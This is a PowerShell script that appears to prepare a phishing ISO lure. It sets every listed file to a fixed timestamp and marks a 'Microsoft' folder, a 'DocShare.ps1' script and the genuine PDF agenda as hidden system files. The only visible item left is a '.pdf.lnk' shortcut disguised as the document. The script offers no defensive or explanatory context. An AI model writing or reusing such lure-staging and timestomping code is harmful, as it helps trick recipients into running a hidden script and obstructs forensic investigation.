$IsoRoot = "C:\tmp\SHARE_1\DocShare"
$Stamp   = Get-Date "2026-05-12 14:30:00"

Set-Location $IsoRoot

@(
    ".\Microsoft"
    ".\Microsoft\DocShare.ps1"
    ".\Shared Documents"
    ".\Shared Documents\Agenda_15-19_6-2026.pdf"
    ".\Agenda_15-19_6-2026.pdf.lnk"
) | ForEach-Object {
    Get-Item -LiteralPath $_ -Force | ForEach-Object {
        $_.CreationTime   = $Stamp
        $_.LastWriteTime  = $Stamp
        $_.LastAccessTime = $Stamp
    }
    if ((Get-Item -LiteralPath $_ -Force).PSIsContainer) {
        Get-ChildItem -LiteralPath $_ -Recurse -Force | ForEach-Object {
            $_.CreationTime   = $Stamp
            $_.LastWriteTime  = $Stamp
            $_.LastAccessTime = $Stamp
        }
    }
}

@(
    ".\Microsoft"
    ".\Microsoft\DocShare.ps1"
    ".\Shared Documents"
    ".\Shared Documents\Agenda_15-19_6-2026.pdf"
) | ForEach-Object {
    Get-Item -LiteralPath $_ -Force | ForEach-Object {
        $_.Attributes = 'Hidden','System'
    }
    if ((Get-Item -LiteralPath $_ -Force).PSIsContainer) {
        Get-ChildItem -LiteralPath $_ -Recurse -Force | ForEach-Object {
            $_.Attributes = 'Hidden','System'
        }
    }
}
